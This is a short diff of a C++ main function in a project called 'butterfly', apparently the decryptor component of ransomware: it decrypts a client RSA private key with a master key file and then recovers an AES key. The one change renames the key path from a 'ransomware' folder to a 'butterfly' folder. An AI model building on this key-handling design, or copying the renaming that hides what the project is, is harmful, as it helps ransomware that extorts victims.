@@ -27,7 +27,7 @@ int main(int argc, char *argv[])
     // start decryption
     std::unique_ptr<butterfly::Decryptor> decryptor(new butterfly::Decryptor());
     std::string cprivate = decryptor->decryptCPrivateRSA(
-            "/home/christian/projects/ransomware/masterkeys/SPrivateRSA.pem");
+            "/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
     decryptor->decryptAESKey(cprivate);
 
 
